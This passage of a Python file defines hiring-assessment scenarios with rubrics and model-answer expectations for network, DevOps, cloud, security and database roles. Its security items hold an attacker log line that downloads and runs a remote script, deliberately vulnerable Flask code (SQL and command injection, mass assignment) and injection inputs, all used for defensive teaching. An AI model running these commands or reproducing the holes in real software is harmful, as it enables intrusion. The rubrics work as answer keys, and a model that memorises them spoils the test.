"""
Curated practical scenarios (AI-reviewed — not executed).

For competencies where running code is not the right assessment — troubleshooting an
outage, reviewing a configuration, designing a React component — the candidate gets a
realistic situation with evidence (logs, configs, outputs) and concrete tasks. The
hosted Qwen model reviews the written answer against the scenario's fixed rubric; the
backend, not the model, turns the per-criterion ratings into the score.

Results are always labelled "AI-reviewed — not executed": nothing is compiled or run,
and no test-case or execution results are ever shown for scenarios.

A scenario is only offered to the roles it lists; its rubric was written for those
roles. Custom (non-catalog) roles get no scenario: a rubric is never improvised.
"""

from __future__ import annotations

from dataclasses import dataclass

LABEL = "AI-reviewed — not executed"
ALL_LEVELS = ("EASY", "MEDIUM", "HARD")


@dataclass(frozen=True)
class Criterion:
    id: str
    title: str
    points: int
    expectations: str  # what a strong answer covers (guidance for the reviewer)


@dataclass(frozen=True)
class Scenario:
    id: str
    title: str
    roles: tuple[str, ...]
    competencies: tuple[str, ...]
    context: str
    tasks: tuple[str, ...]
    rubric: tuple[Criterion, ...]
    estimated_minutes: int = 15
    difficulties: tuple[str, ...] = ALL_LEVELS
    deliverable: str = "A written answer addressing every task."
    # Technologies the scenario itself is built on (e.g. the service's runtime). Follow-up
    # questions may ask about them even if they belong to another role's catalogue.
    stack: tuple[str, ...] = ()


def K(id: str, title: str, points: int, expectations: str) -> Criterion:
    return Criterion(id, title, points, expectations)


NETWORK = ("network-engineer", "network-administrator")
DEVOPS = ("devops-engineer", "site-reliability-engineer")
CLOUD = ("cloud-engineer", "aws-cloud-engineer", "azure-cloud-engineer")
SECURITY = ("cybersecurity-analyst", "security-engineer")
FRONTEND = ("frontend-developer", "react-developer")

SCENARIOS: tuple[Scenario, ...] = (
    # ------------------------------------------------------------------ Networking
    Scenario(
        "net-dns-resolution-failure", "Internal app unreachable by name",
        (*NETWORK, "system-administrator"), ("network-troubleshooting", "sysadmin-troubleshooting"),
        """Since this morning, staff on the 10.20.0.0/16 office network cannot open http://intranet.corp.local.
The same page loads when they browse to http://10.20.4.15. Internet sites work.

From an affected Linux workstation:
$ cat /etc/resolv.conf
nameserver 10.20.0.53
search corp.local
$ dig intranet.corp.local
;; communications error to 10.20.0.53#53: timed out
;; no servers could be reached
$ dig @8.8.8.8 example.com +short
93.184.215.14
$ ping -c2 10.20.0.53
2 packets transmitted, 2 received, 0% packet loss

A firewall change was deployed on the core switch last night ("tighten ACLs between user VLANs and server VLAN").""",
        (
            "Explain what the evidence tells you and what it rules out.",
            "List the most likely root causes in order and how you would confirm each one.",
            "Describe the fix and how you would verify it for users.",
            "Suggest one change that would make this failure less likely or quicker to detect next time.",
        ),
        (
            K("evidence", "Reads the evidence correctly", 25,
              "Notes that IP connectivity and external DNS work, the DNS server answers ping but not DNS queries, so the problem is DNS service/port 53 reachability, not routing or the web server."),
            K("root-cause", "Plausible, prioritised root causes", 30,
              "Prioritises the overnight ACL change blocking UDP/TCP 53 to 10.20.0.53; also considers the DNS service being down on the server or a host firewall; explains how to confirm (e.g. dig +tcp, tcpdump on server, ACL hit counters, checking the service)."),
            K("fix-verify", "Fix and verification", 25,
              "Permits UDP and TCP 53 from user VLANs to the DNS server (least privilege), or restores the service; verifies with dig/nslookup from several VLANs and by loading the intranet by name; mentions client cache flush if needed."),
            K("prevention", "Prevention and detection", 20,
              "Proposes change review/testing for ACLs, synthetic DNS monitoring/alerting, a secondary DNS server, or documented dependencies."),
        ),
    ),
    Scenario(
        "net-static-route-return-path", "Branch LANs cannot reach each other",
        NETWORK, ("routing-switching", "network-troubleshooting"),
        """Two sites are connected by a point-to-point link 172.16.0.0/30.
R1 (site A): LAN 192.168.10.0/24 on Gi0/1, link 172.16.0.1/30 on Gi0/0
R2 (site B): LAN 192.168.20.0/24 on Gi0/1, link 172.16.0.2/30 on Gi0/0

R1 routing table:
C 172.16.0.0/30 is directly connected, Gi0/0
C 192.168.10.0/24 is directly connected, Gi0/1
S 192.168.20.0/24 [1/0] via 172.16.0.2

R2 routing table:
C 172.16.0.0/30 is directly connected, Gi0/0
C 192.168.20.0/24 is directly connected, Gi0/1
S 0.0.0.0/0 [1/0] via 203.0.113.1

From a PC 192.168.10.25, `ping 192.168.20.10` times out. From R1, `ping 192.168.20.10 source Gi0/0` succeeds.""",
        (
            "Explain why the PC's ping fails while the ping sourced from R1's link interface succeeds.",
            "Give the configuration change that fixes it (any vendor syntax, clearly explained).",
            "Explain how you would verify the fix and what else you would check (e.g. return traffic, ACLs).",
            "Would you keep static routes here or use a dynamic routing protocol? Justify briefly.",
        ),
        (
            K("diagnosis", "Correct diagnosis", 35,
              "Identifies that R2 has no route back to 192.168.10.0/24, so replies follow R2's default route to 203.0.113.1; the R1-sourced ping works because 172.16.0.0/30 is directly connected on R2."),
            K("fix", "Correct fix", 30,
              "Adds a static route on R2: 192.168.10.0/24 via 172.16.0.1 (e.g. `ip route 192.168.10.0 255.255.255.0 172.16.0.1`), explains next hop/interface choice."),
            K("verification", "Verification", 20,
              "Checks the routing table, pings/traceroutes in both directions from hosts, considers ACLs/firewalls and host gateways."),
            K("design", "Design judgement", 15,
              "Sensible trade-off: static routes are fine for two stable sites; a dynamic protocol (OSPF) scales and converges when sites/links grow or redundancy is added."),
        ),
    ),
    Scenario(
        "net-vlan-dhcp-apipa", "New desk PC gets a 169.254.x.x address",
        NETWORK, ("network-troubleshooting", "routing-switching"),
        """A new PC was patched into switch port Gi1/0/14 for the Finance team (VLAN 30, 10.30.0.0/24, gateway 10.30.0.1).
The PC shows IPv4 169.254.88.12 and "No internet". Other Finance PCs on the same switch work.

SW1# show running-config interface Gi1/0/14
interface GigabitEthernet1/0/14
 switchport mode access
 switchport access vlan 20
 spanning-tree portfast

SW1# show running-config interface Gi1/0/9   (a working Finance PC)
interface GigabitEthernet1/0/9
 switchport mode access
 switchport access vlan 30
 spanning-tree portfast

The DHCP server is 10.10.0.20 in the server VLAN. The core router has `ip helper-address 10.10.0.20` on the VLAN 30 interface only. VLAN 20 is the Lab VLAN.""",
        (
            "What does the 169.254.x.x address mean and what is the most likely cause here?",
            "List the exact changes you would make and anything you would double-check first.",
            "How would you confirm the PC is now working end to end?",
            "What process or configuration practice would prevent this?",
        ),
        (
            K("apipa", "Understands APIPA", 20, "Explains 169.254/16 is a self-assigned address after DHCP failed (no DHCP offer received)."),
            K("cause", "Finds the cause", 35,
              "Port Gi1/0/14 is in VLAN 20 (Lab) instead of VLAN 30; VLAN 20 has no DHCP relay, so no lease; contrasts with the working port."),
            K("fix", "Correct fix", 25,
              "Sets `switchport access vlan 30` on Gi1/0/14 (confirms the intended VLAN with the requester), bounces the port or renews DHCP (ipconfig /renew), optionally checks port security/802.1X."),
            K("verify-prevent", "Verification and prevention", 20,
              "Checks lease in correct subnet, gateway ping, DNS and an app; suggests port templates/automation, documentation or NAC to prevent mis-assignment."),
        ),
    ),
    Scenario(
        "netsec-firewall-rule-review", "Review a perimeter firewall policy",
        ("network-security-engineer",), ("firewalls",),
        """Perimeter firewall rules (evaluated top to bottom, first match wins):
1  permit tcp any        -> 10.0.5.10 port 443      "web server"
2  permit ip  10.0.0.0/8 -> any                      "internal outbound"
3  permit tcp any        -> 10.0.5.0/24 port 3389   "vendor RDP support"
4  permit tcp any        -> 10.0.5.20 port 22       "jump host"
5  deny   tcp any        -> 10.0.5.0/24 port 3389   "block RDP"
6  permit udp any        -> any port 53             "DNS"
7  deny   ip  any        -> any                      "default deny" (logging disabled)

The vendor connects from 198.51.100.0/28. Admins connect to the jump host from the office public range 203.0.113.0/27.""",
        (
            "Identify the security problems in this rule set and rate each one's risk.",
            "Propose a corrected rule set (in any clear notation) applying least privilege.",
            "What logging, monitoring or review process would you add?",
        ),
        (
            K("rule-order", "Spots shadowing and order issues", 25, "Rule 5 is shadowed by rule 3, so RDP is open to the internet; explains first-match evaluation."),
            K("risks", "Identifies the main risks", 30,
              "RDP from any and SSH from any to the jump host; rule 6 allows DNS to any destination inbound (amplification/tunnelling); overly broad internal outbound; default deny without logging."),
            K("corrected", "Least-privilege rule set", 30,
              "Restricts RDP to 198.51.100.0/28 (ideally via VPN/jump host, time-bound), SSH to 203.0.113.0/27, DNS only to/from designated resolvers, egress filtering, explicit deny with logging at the end."),
            K("operations", "Logging and review", 15, "Enables logging on deny/sensitive permits, SIEM alerts, periodic rule review and change approval."),
        ),
    ),
    Scenario(
        "netsec-ids-alert-triage", "Triage a burst of IDS alerts",
        ("network-security-engineer",), ("ids-ips",),
        """Suricata raised these alerts in 10 minutes (sensor on the DMZ segment):
09:01:12 ET SCAN Nmap Scripting Engine User-Agent  src 45.83.12.9 -> 10.0.5.10:443  (x142)
09:03:40 ET WEB_SERVER Possible SQL Injection (UNION SELECT)  src 45.83.12.9 -> 10.0.5.10:443  (x37)
09:04:02 ET POLICY Outbound TLS to self-signed cert  src 10.0.5.10 -> 185.220.101.4:8443  (x1)
09:06:55 SURICATA STREAM excessive retransmissions  src 10.0.7.3 -> 10.0.5.30:5432  (x210)

Web server 10.0.5.10 runs a public PHP app. 10.0.7.3 is the backup server; 10.0.5.30 is PostgreSQL.
Web access logs show `GET /products.php?id=1 UNION SELECT ...` requests returning HTTP 200 with response sizes 10× larger than normal.""",
        (
            "Triage each alert: true positive, likely false positive, or needs investigation — and why.",
            "Which alert worries you most and what are your immediate next steps?",
            "What tuning or IPS rule changes would you propose afterwards?",
        ),
        (
            K("triage", "Accurate triage", 35,
              "Scan is real but low impact alone; SQLi alerts with 200 responses and larger bodies indicate likely successful injection; outbound TLS from the web server to an unusual host after the attack is highly suspicious; retransmissions on backup→DB are probably operational, not an attack."),
            K("priority", "Correct priority", 25, "Prioritises the possible compromise of 10.0.5.10 (SQLi success + outbound connection to unknown host) over the scan."),
            K("response", "Sensible next steps", 25,
              "Contains (block attacker and destination IP, isolate or snapshot the host), preserves evidence, checks DB/app logs for exfiltration, escalates to incident response, fixes the SQLi."),
            K("tuning", "Tuning and prevention", 15, "Moves SQLi signatures to blocking (IPS/WAF), tunes noisy rules, adds egress controls and alerting for DMZ outbound."),
        ),
    ),
    # ------------------------------------------------------------------ DevOps / SRE / Cloud
    Scenario(
        "devops-container-restart-loop", "A container keeps restarting",
        DEVOPS, ("containers",),
        """`orders-api` restarts every few seconds after today's deploy.

$ docker ps -a --filter name=orders-api
STATUS: Restarting (137) 4 seconds ago
$ docker inspect orders-api --format '{{.State.OOMKilled}} {{.HostConfig.Memory}}'
true 268435456
$ docker logs --tail 5 orders-api
[boot] loading product catalogue into memory (2.1M items)...
[boot] cache warmed: 310 MB

Dockerfile:
FROM node:latest
WORKDIR /app
COPY . .
RUN npm install
ENV NODE_ENV=development
CMD ["npm", "start"]""",
        (
            "Explain what exit code 137 and OOMKilled=true tell you and why the container is restarting.",
            "Give two different ways to fix the immediate problem and when you would choose each.",
            "Review the Dockerfile and list concrete improvements with reasons.",
        ),
        (
            K("diagnosis", "Correct diagnosis", 30,
              "137 = SIGKILL (128+9); OOMKilled true: the process exceeded the 256 MiB memory limit while warming a ~310 MB cache; restart policy causes the loop."),
            K("fixes", "Appropriate fixes", 30,
              "Raise the memory limit to fit the measured need with headroom, and/or reduce memory use (lazy/partial cache, external cache like Redis, streaming); mentions Node heap settings (--max-old-space-size) and measuring."),
            K("dockerfile", "Dockerfile review", 30,
              "Pin a specific base image (not latest; slim/alpine), copy package files first for layer caching, `npm ci --omit=dev`, NODE_ENV=production, .dockerignore, run as non-root user, run node directly (signal handling), healthcheck."),
            K("verify", "Verification", 10, "Checks memory with docker stats/metrics after the fix and adds alerting on OOM kills/restarts."),
        ),
        stack=("node.js", "npm"),
    ),
    Scenario(
        "devops-k8s-pending-no-endpoints", "Kubernetes rollout stuck",
        DEVOPS, ("kubernetes",),
        """A new Deployment `checkout` (3 replicas) is not serving traffic.

$ kubectl get pods -l app=checkout
checkout-7c9f-abcde   0/1   Pending   0   6m
checkout-7c9f-fghij   0/1   Running   0   6m
checkout-7c9f-klmno   0/1   Running   0   6m

$ kubectl describe pod checkout-7c9f-abcde
Events: 0/3 nodes are available: 3 Insufficient memory.

$ kubectl describe pod checkout-7c9f-fghij
Readiness probe failed: Get "http://10.1.2.7:8080/healthz": connection refused

$ kubectl get endpoints checkout
NAME       ENDPOINTS   AGE
checkout   <none>      6m

Manifest excerpt:
resources: { requests: { memory: "6Gi", cpu: "500m" }, limits: { memory: "6Gi" } }
containers: - name: checkout  ports: - containerPort: 3000
readinessProbe: { httpGet: { path: /healthz, port: 8080 } }
Nodes: 3 × 8 GiB, each already running ~3 GiB of workloads.""",
        (
            "Explain each symptom: the Pending pod, the Running-but-not-ready pods, and the empty endpoints.",
            "Give the specific manifest changes you would make.",
            "How would you roll this out safely and confirm it works?",
        ),
        (
            K("pending", "Explains Pending", 25, "6Gi memory request cannot fit on nodes with ~5 GiB free; scheduler reports insufficient memory; right-size requests or add capacity/autoscaling."),
            K("readiness", "Explains readiness failure", 30,
              "Probe targets port 8080 but the container listens on 3000, so pods never become Ready, so the Service has no endpoints."),
            K("changes", "Correct changes", 30, "Fix probe port (3000 or named port), set realistic requests/limits from measurements, consider a startup probe; maybe adjust replicas or node capacity."),
            K("rollout", "Safe rollout", 15, "Uses rolling update with maxUnavailable/maxSurge, watches `kubectl rollout status`, checks endpoints and service traffic, can roll back."),
        ),
    ),
    Scenario(
        "devops-ci-pipeline-failure", "CI fails but tests pass locally",
        DEVOPS, ("ci-cd",),
        """GitHub Actions workflow for a Node.js service:

on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 16 }
      - run: npm install
      - run: npm test
      - run: ./deploy.sh production
        env: { DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }} }

Failing log:
> npm test
TypeError: structuredClone is not defined   (src/cart.js:14)
Tests: 3 failed, 118 passed

Developers use Node 20 locally. package.json has no "engines" field. A contributor's pull request from a fork also triggered the workflow.""",
        (
            "Why do the tests fail in CI but pass locally?",
            "What other problems do you see in this workflow? Rate their seriousness.",
            "Write or describe the corrected workflow.",
        ),
        (
            K("cause", "Root cause", 25, "CI uses Node 16 where structuredClone is unavailable (added in Node 17); local Node 20; version mismatch."),
            K("problems", "Spots workflow risks", 35,
              "Deploys to production on every push and pull_request (including forks) — no branch/environment protection; deploy runs on PR code with a secret; npm install instead of npm ci (non-reproducible); no caching; no engines/.nvmrc to pin the version."),
            K("corrected", "Corrected workflow", 30,
              "Pins Node 20 (matrix or .nvmrc), uses npm ci with cache, separates build/test from deploy, deploy only on push to main with `needs`, environment protection/approvals, least-privilege permissions."),
            K("practice", "Engineering practice", 10, "Adds engines field, keeps local and CI parity, required status checks before merge."),
        ),
    ),
    Scenario(
        "cloud-iac-plan-replacement", "A Terraform plan wants to replace the database",
        (*DEVOPS, *CLOUD), ("iac",),
        """Pull request: "rename database for naming convention". `terraform plan` output (excerpt):

  # aws_db_instance.orders must be replaced
-/+ resource "aws_db_instance" "orders" {
      ~ identifier          = "orders-db" -> "prod-orders-db" # forces replacement
      ~ allocated_storage   = 200 -> 100
        engine              = "postgres"
    }
  # aws_security_group.db will be updated in-place
  ~ ingress { cidr_blocks = ["10.0.0.0/16"] -> ["0.0.0.0/0"] }

Plan: 1 to add, 1 to change, 1 to destroy.

The team says allocated_storage was raised to 200 in the console last month during an incident. State is in S3 with DynamoDB locking.""",
        (
            "Explain what will happen if this plan is applied, step by step.",
            "Identify each risk in the plan and how it arose.",
            "Describe how you would achieve the rename (if at all) and reconcile the drift safely.",
            "What guard rails would you add to the IaC workflow?",
        ),
        (
            K("impact", "Understands the impact", 30,
              "Changing identifier forces destroy-and-create of the RDS instance → data loss/downtime unless snapshot/restore; storage shrink not allowed/dangerous; SG opens DB to the internet."),
            K("drift", "Explains drift", 20, "Console change to 200 GB is drift; code still says 100; plan would revert it."),
            K("safe-approach", "Safe approach", 30,
              "Don't rename (cosmetic) or do it via snapshot/restore/migration window; update code to 200 GB to match reality; keep SG restricted; use lifecycle prevent_destroy, terraform import/state mv where relevant; take a snapshot first."),
            K("guardrails", "Guard rails", 20, "Plan review in CI, policy-as-code (e.g. block 0.0.0.0/0 on DB SGs, block destroys of stateful resources), drift detection, deletion protection, least-privilege console access."),
        ),
    ),
    Scenario(
        "cloud-private-subnet-egress", "Private instances cannot install updates",
        CLOUD, ("cloud-networking", "cloud-compute"),
        """A VPC 10.50.0.0/16 has:
- public subnet 10.50.1.0/24, route table rt-public: 10.50.0.0/16 local; 0.0.0.0/0 -> igw-123
- private subnet 10.50.2.0/24, route table rt-private: 10.50.0.0/16 local; 0.0.0.0/0 -> igw-123

Instance app-1 (10.50.2.15, no public IP) in the private subnet:
$ sudo apt-get update
Err:1 http://archive.ubuntu.com jammy InRelease  Could not connect to archive.ubuntu.com:80 (timed out)
Security group sg-app: inbound 443 from the load balancer SG; outbound all traffic to 0.0.0.0/0.
Network ACLs: default (allow all).

Security policy: application servers must not be directly reachable from the internet.""",
        (
            "Why does app-1 have no internet access?",
            "Design the fix (components and route table changes) that satisfies the security policy.",
            "Mention cost, availability and alternatives (e.g. for package mirrors or cloud APIs).",
        ),
        (
            K("diagnosis", "Correct diagnosis", 30,
              "A route to an internet gateway only works for instances with a public IP; app-1 has only a private address, so traffic to the internet cannot be translated/returned."),
            K("design", "Correct design", 35,
              "Add a NAT gateway in the public subnet with an Elastic IP; private route table 0.0.0.0/0 -> nat-gw; keep app instances without public IPs; SG stays restrictive."),
            K("tradeoffs", "Trade-offs", 20, "NAT gateway cost per hour/GB, one per AZ for availability, VPC endpoints (S3/ECR/SSM) or internal mirrors/proxy to reduce NAT traffic."),
            K("verify", "Verification", 15, "Tests apt-get update/curl from app-1, checks route tables and flow logs, confirms no inbound exposure."),
        ),
    ),
    Scenario(
        "sre-error-budget-decision", "Error budget burned mid-month",
        ("site-reliability-engineer",), ("slo", "incident-management"),
        """Checkout API SLO: 99.9% of requests successful over a 30-day window (request-based; equivalent to ~43 minutes of full downtime).
Day 12 status:
- Incident A (day 3): 100% errors for 22 minutes.
- Incident B (day 10): 30% of requests failing for 60 minutes.
- Normal background error rate: 0.02% of requests.
- Product wants to ship a large payment-provider migration on day 14.
Current alerting: page when the error rate is above 5% for 10 minutes.""",
        (
            "Estimate how much of the error budget has been consumed so far (show your reasoning; approximations are fine).",
            "Recommend whether the migration should ship on day 14 and under what conditions.",
            "Critique the current alerting and propose better SLO-based alerts.",
            "What should the incident reviews for A and B focus on?",
        ),
        (
            K("budget-math", "Error budget reasoning", 30,
              "Budget ≈ 0.1% of requests ≈ 43.2 minutes; A ≈ 22 min, B ≈ 0.3 × 60 = 18 min, background ≈ 0.02%/0.1% ≈ 20% of budget so far proportionally (~3.5 min over 12 days); total roughly 40+ min, i.e. most or all of the budget is spent."),
            K("decision", "Sound release decision", 30,
              "Applies the error-budget policy: freeze or gate risky launches; if shipping, use canary/feature flags, rollback plan, extra monitoring, staffing; ties decision to reliability work."),
            K("alerting", "Better alerting", 25, "Multi-window, multi-burn-rate alerts (e.g. fast burn 14.4× over 1h/5m, slow burn 6× over 6h/30m); explains why a fixed 5%/10min threshold misses partial outages like B."),
            K("reviews", "Incident review focus", 15, "Blameless reviews, timelines, detection/mitigation time, action items with owners."),
        ),
    ),
    Scenario(
        "linux-disk-full-iowait", "Server out of disk space and slow",
        ("linux-administrator", "system-administrator"), ("linux-troubleshooting", "sysadmin-troubleshooting", "os-administration"),
        """Web server alerts: "disk full" and high load.

$ df -h /
Filesystem  Size  Used Avail Use% Mounted on
/dev/sda1    50G   50G     0 100% /
$ sudo du -sh /var/log
1.2G  /var/log
$ uptime
load average: 18.4, 17.9, 15.2   (4 CPUs)
$ top (excerpt): %Cpu(s): 6 us, 3 sy, 0 id, 89 wa
A colleague already ran `rm /var/log/app/debug.log` (it was 41G) but `df` still shows 100%.
$ sudo lsof +L1 | head -3
COMMAND  PID  USER  FD  TYPE  SIZE/OFF      NLINK NODE NAME
java    2210  app   7w  REG   44023455744   0     1234 /var/log/app/debug.log (deleted)""",
        (
            "Explain why deleting the file did not free space and why the load is so high.",
            "Give the exact steps to recover space safely, in order.",
            "Propose changes so this does not happen again.",
        ),
        (
            K("explanation", "Explains the symptoms", 30,
              "The java process still holds the deleted file open, so blocks are not freed until the descriptor closes; load is high because processes wait on I/O (89% iowait) on a full disk."),
            K("recovery", "Safe recovery steps", 35,
              "Truncate via /proc/2210/fd/7 (e.g. `: > /proc/2210/fd/7`) or gracefully restart the app; confirm with df; check other large files (du/ncdu); avoid deleting random files; consider reserved blocks."),
            K("prevention", "Prevention", 25, "logrotate with copytruncate or app-level rotation, lower log level in production, monitoring and alerts on disk usage, separate /var/log partition, log shipping."),
            K("communication", "Operational care", 10, "Communicates impact, checks the app recovered, documents the incident."),
        ),
    ),
    # ------------------------------------------------------------------ Security
    Scenario(
        "sec-auth-log-bruteforce", "Suspicious SSH activity",
        SECURITY, ("log-analysis", "incident-response", "threat-analysis"),
        """/var/log/auth.log excerpt from bastion host bastion-1 (UTC):
03:12:01 sshd[901]: Failed password for invalid user admin from 185.10.12.7 port 50122
03:12:02 sshd[903]: Failed password for invalid user test from 185.10.12.7 port 50130
... (1,842 similar lines from 185.10.12.7 between 03:12 and 03:41)
03:41:17 sshd[2511]: Failed password for deploy from 185.10.12.7 port 61001
03:41:19 sshd[2513]: Accepted password for deploy from 185.10.12.7 port 61005
03:42:03 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://185.10.12.7/x.sh -o /tmp/x.sh
03:42:09 sudo: deploy : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
03:44:30 useradd[2601]: new user: name=sysupdate, UID=0
sshd_config: PasswordAuthentication yes, PermitRootLogin no. The deploy user has passwordless sudo.""",
        (
            "Build a short timeline and state what happened.",
            "List the indicators of compromise you would hunt for elsewhere.",
            "Describe immediate containment and the next investigation steps.",
            "Recommend hardening changes.",
        ),
        (
            K("timeline", "Accurate timeline", 25,
              "Brute force from 185.10.12.7, successful password login as deploy at 03:41:19, privilege escalation via passwordless sudo, download and execution of x.sh, creation of a UID 0 backdoor user."),
            K("iocs", "Indicators of compromise", 20, "Attacker IP, /tmp/x.sh hash and contents, user sysupdate (UID 0), new SSH keys/cron/systemd units, outbound connections, other hosts accessed from the bastion."),
            K("containment", "Containment and investigation", 35,
              "Isolate the host (preserve memory/disk evidence first if possible), block the IP, disable deploy and sysupdate, rotate credentials/keys reachable from the bastion, check lateral movement, escalate per IR plan, rebuild from known-good image."),
            K("hardening", "Hardening", 20, "Disable password auth (keys + MFA), fail2ban/rate limiting, restrict SSH to VPN/allowlist, remove passwordless sudo, alerting on new UID 0 accounts and sudo use."),
        ),
    ),
    Scenario(
        "sec-code-review-flask", "Security review of an API endpoint",
        (*SECURITY, "application-security-engineer", "penetration-tester"),
        ("vulnerability-assessment", "owasp", "web-exploitation"),
        """Python Flask service (excerpt):

app.config["SECRET_KEY"] = "dev-secret-123"

@app.route("/api/invoices/<invoice_id>")
@login_required
def get_invoice(invoice_id):
    row = db.execute(f"SELECT * FROM invoices WHERE id = {invoice_id}").fetchone()
    return jsonify(dict(row))

@app.route("/admin/export")
def export_all():
    fmt = request.args.get("format", "csv")
    os.system(f"/opt/tools/export --format {fmt} --out /tmp/export")
    return send_file("/tmp/export")

@app.route("/api/profile", methods=["POST"])
@login_required
def update_profile():
    current_user.update(**request.json)   # fields: name, email, role, is_admin ...
    return {"ok": True}""",
        (
            "List every vulnerability you find, its OWASP category and a severity with justification.",
            "For the two most severe issues, explain how an attacker could abuse them (no working exploit code needed).",
            "Show corrected code or precise fixes for each issue.",
        ),
        (
            K("coverage", "Finds the vulnerabilities", 35,
              "SQL injection in get_invoice; IDOR (no check that the invoice belongs to the user); unauthenticated admin endpoint; OS command injection via format; mass assignment allowing role/is_admin escalation; hard-coded weak secret key; predictable shared /tmp file."),
            K("severity", "Severity and impact reasoning", 20, "Ranks command injection and SQLi/unauthenticated admin export as critical; explains impact (RCE, data exposure, privilege escalation)."),
            K("abuse", "Explains abuse paths", 15, "Describes realistic abuse (e.g. format=csv;id, id=1 OR 1=1, setting is_admin=true) without needing a weaponised exploit."),
            K("fixes", "Correct fixes", 30,
              "Parameterised queries, ownership checks, auth + admin authorisation, allowlist format and subprocess without shell, field allowlist for updates, secret from environment/secret manager, unique temp files."),
        ),
    ),
    Scenario(
        "sec-phishing-account-takeover", "Phishing leads to a mailbox compromise",
        SECURITY, ("incident-response", "threat-analysis", "log-analysis"),
        """At 10:05 a finance employee reports entering their password on a fake "SharePoint" page after a phishing email.
Identity provider logs:
10:07 sign-in success, user=riya@corp.example, IP 102.67.4.9 (country: unusual), MFA: push approved (after 9 denied pushes 10:06–10:07)
10:09 new inbox rule: forward messages containing "invoice" OR "payment" to accounts-update@protonmail.example, then delete
10:15 OAuth consent granted to app "Mail Backup Pro" (Mail.ReadWrite, offline_access)
10:20 3 emails sent from riya@ to vendors: "Please note our new bank details for payments"
The same phishing email was delivered to 46 other employees.""",
        (
            "Prioritise your containment actions for the first hour.",
            "What evidence would you collect and what scope questions must you answer?",
            "How would you handle the vendor emails and the 46 other recipients?",
            "What lasting controls would reduce the chance and impact of this attack?",
        ),
        (
            K("containment", "Containment priorities", 35,
              "Revoke sessions/refresh tokens, reset password, re-register MFA, remove the inbox rule, revoke the OAuth app consent, block sender/domain/URL and the IP, keep evidence before deletion."),
            K("scope", "Evidence and scoping", 20, "Audit and mailbox logs, data accessed/forwarded, other sign-ins from the IP, other users who clicked or approved pushes, OAuth app usage."),
            K("comms", "Business and user response", 25, "Contacts vendors through known-good channels to retract the bank-detail emails, alerts finance to hold payments, purges the phishing email from all mailboxes, notifies the 46 recipients, checks who clicked."),
            K("controls", "Lasting controls", 20, "Phishing-resistant MFA or number matching, push-fatigue protections, restrict OAuth consent, external forwarding blocked, payment-change verification process, awareness training."),
        ),
    ),
    Scenario(
        "appsec-threat-model-upload", "Threat-model a file upload feature",
        ("application-security-engineer",), ("threat-modeling", "owasp"),
        """Design for a new "profile documents" feature:
1. Browser uploads a file (max 20 MB) to POST /api/documents; the API stores it in an object storage bucket under documents/{user_id}/{original_filename}.
2. A worker picks up new files, generates thumbnails with ImageMagick and extracts text from PDFs.
3. Files are served back via GET /files/{path} which proxies the bucket.
4. Support staff can view any user's documents from an internal admin panel.""",
        (
            "Draw (in words) the trust boundaries and data flows.",
            "Identify the most important threats (e.g. using STRIDE) with their likely impact.",
            "Propose mitigations and say which you would require before launch.",
        ),
        (
            K("boundaries", "Trust boundaries", 20, "Browser↔API, API↔storage, storage↔worker, admin panel↔data; notes the worker processes untrusted files."),
            K("threats", "Key threats", 40,
              "Path traversal/overwrite via original_filename, IDOR on GET /files/{path}, malicious files exploiting ImageMagick/PDF parsers (RCE/SSRF), stored XSS via served HTML/SVG, DoS via huge/decompression-bomb files, malware distribution, insider abuse by support staff."),
            K("mitigations", "Effective mitigations", 30,
              "Generated object keys, authorisation on every download, content-type allowlist and magic-byte checks, sandboxed/isolated worker with patched libraries and policies, Content-Disposition: attachment and separate domain, size/time limits, AV scanning, audited and least-privilege admin access."),
            K("prioritisation", "Prioritisation", 10, "Separates launch blockers from follow-ups with sensible reasoning."),
        ),
    ),
    Scenario(
        "pentest-recon-findings", "Prioritise reconnaissance results",
        ("penetration-tester",), ("recon", "reporting", "web-exploitation"),
        """Authorised external test of 198.51.100.0/28 (scope: these IPs only, no denial of service).

nmap -sV results (excerpt):
198.51.100.3  22/tcp OpenSSH 7.4 ; 443/tcp nginx 1.14.0
198.51.100.5  3306/tcp MySQL 5.5.62 ; 8080/tcp Apache Tomcat 8.5.23 (/manager/html returns 401)
198.51.100.9  443/tcp IIS 10.0 ; TLS certificate CN=vpn.corp.example ; 3389/tcp ms-wbt-server
198.51.100.12 80/tcp "Jenkins 2.89" (dashboard visible without login)""",
        (
            "Rank the findings by likely risk and explain your reasoning.",
            "Describe your next testing steps for the top two, staying within scope and rules of engagement.",
            "Write one finding as it would appear in the report (title, severity, description, evidence, remediation).",
        ),
        (
            K("ranking", "Risk ranking", 30, "Ranks unauthenticated Jenkins (likely code execution via script console/jobs) and internet-exposed MySQL/Tomcat manager and RDP above SSH/nginx; notes outdated versions."),
            K("next-steps", "Next steps within scope", 30, "Verifies access safely (version checks, default credentials policy per RoE), avoids DoS/brute force beyond agreed limits, documents evidence, stops and reports critical issues promptly."),
            K("report", "Quality of the written finding", 30, "Clear title, justified severity (e.g. CVSS), reproducible evidence, business impact, concrete remediation (restrict exposure, auth, patching)."),
            K("ethics", "Professional conduct", 10, "Respects scope and rules of engagement, handles data carefully."),
        ),
    ),
    # ------------------------------------------------------------------ Databases
    Scenario(
        "dba-slow-query-plan", "A query became slow as the table grew",
        ("database-administrator",), ("dba-performance", "dba-monitoring"),
        """Query from the customer portal (PostgreSQL 15), now 4.8 s at peak:

SELECT id, created_at, total FROM orders
WHERE customer_id = $1 AND status = 'shipped'
ORDER BY created_at DESC LIMIT 20;

EXPLAIN ANALYZE (excerpt):
Limit  (actual time=4790..4791 rows=20)
  -> Sort  (Sort Key: created_at DESC)  (Sort Method: top-N heapsort)
     -> Seq Scan on orders  (rows=1830 filter: customer_id = 4412 AND status = 'shipped')
          Rows Removed by Filter: 21,960,118
Existing indexes: orders_pkey (id), orders_status_idx (status)
Table: 22M rows, ~70% have status 'shipped'. Writes: ~150 inserts/s.""",
        (
            "Explain why the planner chose this plan and why it is slow.",
            "Propose an index (exact definition) and explain the column order.",
            "Discuss the trade-offs and how you would roll the change out on a busy production table.",
            "How would you confirm the improvement and keep it healthy over time?",
        ),
        (
